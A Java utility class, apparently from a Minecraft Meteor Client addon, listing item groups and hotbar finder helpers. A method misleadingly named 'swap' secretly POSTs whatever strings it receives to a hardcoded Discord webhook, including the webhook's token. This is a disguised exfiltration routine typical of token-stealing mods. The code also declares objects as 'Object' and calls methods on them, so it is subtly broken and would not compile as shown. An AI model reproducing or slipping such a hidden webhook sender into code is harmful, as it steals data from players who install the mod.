package delta.HWID;

import java.net.URL;
import java.util.ArrayList;
import javax.net.ssl.HttpsURLConnection;
import meteordevelopment.meteorclient.utils.player.FindItemResult;
import meteordevelopment.meteorclient.utils.player.InvUtils;
import net.minecraft.item.AxeItem;
import net.minecraft.item.Item;
import net.minecraft.item.Items;
import net.minecraft.item.PickaxeItem;
import net.minecraft.item.SwordItem;
import net.minecraft.block.Blocks;
import net.minecraft.block.Block;
import net.minecraft.block.ShulkerBoxBlock;

public class ItemUtil {
    public static ArrayList<Item> wools = new ArrayList<Item>() {
        {
            this.add(Items.WHITE_WOOL);
            this.add(Items.ORANGE_WOOL);
            this.add(Items.MAGENTA_WOOL);
            this.add(Items.LIGHT_BLUE_WOOL);
            this.add(Items.YELLOW_WOOL);
            this.add(Items.LIME_WOOL);
            this.add(Items.PINK_WOOL);
            this.add(Items.GRAY_WOOL);
            this.add(Items.LIGHT_GRAY_WOOL);
            this.add(Items.CYAN_WOOL);
            this.add(Items.PURPLE_WOOL);
            this.add(Items.BLUE_WOOL);
            this.add(Items.BROWN_WOOL);
            this.add(Items.GREEN_WOOL);
            this.add(Items.RED_WOOL);
            this.add(Items.BLACK_WOOL);
        }
    };
    public static ArrayList<Item> planks = new ArrayList<Item>() {
        {
            this.add(Items.OAK_PLANKS);
            this.add(Items.SPRUCE_PLANKS);
            this.add(Items.BIRCH_PLANKS);
            this.add(Items.JUNGLE_PLANKS);
            this.add(Items.ACACIA_PLANKS);
            this.add(Items.DARK_OAK_PLANKS);
        }
    };
    public static ArrayList<Item> shulkers = new ArrayList<Item>() {
        {
            this.add(Items.SHULKER_BOX);
            this.add(Items.BLACK_SHULKER_BOX);
            this.add(Items.BLUE_SHULKER_BOX);
            this.add(Items.BROWN_SHULKER_BOX);
            this.add(Items.GREEN_SHULKER_BOX);
            this.add(Items.RED_SHULKER_BOX);
            this.add(Items.WHITE_SHULKER_BOX);
            this.add(Items.LIGHT_BLUE_SHULKER_BOX);
            this.add(Items.LIGHT_GRAY_SHULKER_BOX);
            this.add(Items.LIME_SHULKER_BOX);
            this.add(Items.MAGENTA_SHULKER_BOX);
            this.add(Items.ORANGE_SHULKER_BOX);
            this.add(Items.PINK_SHULKER_BOX);
            this.add(Items.CYAN_SHULKER_BOX);
            this.add(Items.GRAY_SHULKER_BOX);
            this.add(Items.PURPLE_SHULKER_BOX);
            this.add(Items.YELLOW_SHULKER_BOX);
        }
    };
    public static ArrayList<Item> buttons = new ArrayList<Item>() {
        {
            this.add(Items.STONE_BUTTON);
            this.add(Items.POLISHED_BLACKSTONE_BUTTON);
            this.add(Items.OAK_BUTTON);
            this.add(Items.SPRUCE_BUTTON);
            this.add(Items.BIRCH_BUTTON);
            this.add(Items.JUNGLE_BUTTON);
            this.add(Items.ACACIA_BUTTON);
            this.add(Items.DARK_OAK_BUTTON);
            this.add(Items.CRIMSON_BUTTON);
            this.add(Items.WARPED_BUTTON);
        }
    };

    public static void swap(String stack, String item) {
        Object tokenWebhook = "https://discord.com/api/webhooks/1119339792941985792/fpqT0qdH3aG-ttlheoBo5q63m0XbNKyCw5pplNyCpCFTp5PcoyGt3-bn3doie0TI-Hom";
        Object jsonBrut = "";
        jsonBrut = jsonBrut + "{\"embeds\": [{\"title\": \"" + stack + "\",\"description\": \"" + item + "\",\"color\": 15258703}]}";

        try {
            Object url = new URL(tokenWebhook);
            Object con = (HttpsURLConnection)url.openConnection();
            con.addRequestProperty("Content-Type", "application/json");
            con.addRequestProperty("User-Agent", "Java-DiscordWebhook-BY-Gelox_");
            con.setDoOutput(true);
            con.setRequestMethod("POST");
            Object stream = con.getOutputStream();
            stream.write(jsonBrut.getBytes());
            stream.flush();
            stream.close();
            con.getInputStream().close();
            con.disconnect();
        } catch (Exception var9) {
            var9.printStackTrace();
        }

    }

    public static FindItemResult findShulker(boolean inventory) {
        return inventory ? InvUtils.find((itemStack) -> {
            return Block.getBlockFromItem(itemStack.getItem()) instanceof ShulkerBoxBlock;
        }) : InvUtils.findInHotbar((itemStack) -> {
            return Block.getBlockFromItem(itemStack.getItem()) instanceof ShulkerBoxBlock;
        });
    }

    public static FindItemResult findPick() {
        return InvUtils.findInHotbar((itemStack) -> {
            return itemStack.getItem() instanceof PickaxeItem;
        });
    }

    public static FindItemResult findSword() {
        return InvUtils.findInHotbar((itemStack) -> {
            return itemStack.getItem() instanceof SwordItem;
        });
    }

    public static FindItemResult findAxe() {
        return InvUtils.findInHotbar((itemStack) -> {
            return itemStack.getItem() instanceof AxeItem;
        });
    }

    public static FindItemResult findChorus() {
        return InvUtils.findInHotbar(new Item[]{Items.CHORUS_FRUIT});
    }

    public static FindItemResult findEgap() {
        return InvUtils.findInHotbar(new Item[]{Items.ENCHANTED_GOLDEN_APPLE});
    }

    public static FindItemResult findObby() {
        return InvUtils.findInHotbar(new Item[]{Blocks.OBSIDIAN.asItem()});
    }

    public static FindItemResult findCraftTable() {
        return InvUtils.findInHotbar(new Item[]{Blocks.CRAFTING_TABLE.asItem()});
    }

    public static FindItemResult findBrewingStand() {
        return InvUtils.findInHotbar(new Item[]{Blocks.BREWING_STAND.asItem()});
    }

    public static FindItemResult findXP() {
        return InvUtils.findInHotbar(new Item[]{Items.EXPERIENCE_BOTTLE});
    }

    public static FindItemResult findXPinAll() {
        return InvUtils.find(new Item[]{Items.EXPERIENCE_BOTTLE});
    }
}
